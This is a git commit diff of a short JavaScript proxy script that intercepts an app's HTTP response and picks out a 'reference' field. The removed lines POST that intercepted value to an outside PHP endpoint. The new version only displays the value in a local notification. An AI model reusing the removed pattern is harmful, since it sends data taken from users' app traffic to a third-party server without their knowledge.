4709c9ff93b3ee4c7d59a07eb15508c08a796420
chucyfunny <125993050+chucyfunny@users.noreply.github.com>
2024-08-14 10:13:10 +0800

    Update reference.js

--- reference.js
+++ reference.js
@@ -2,14 +2,7 @@ let body = $response.body;
 let obj = JSON.parse(body);
 
 if (obj.reference) {
-    fetch("https://mpfacetxt.myngn.top/get_ref.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ "reference": obj.reference })
-    })
-    .then(response => response.json())
-    .then(data => $notify("Reference Status", "", data.status === "success" ? "Reference sent successfully!" : "Failed to send reference: " + data.message))
-    .catch(error => $notify("Reference Failed", "", "An error occurred: " + error.message));
+    $notify("Reference Captured", "Reference:", obj.reference);
 }
 
 $done({body});
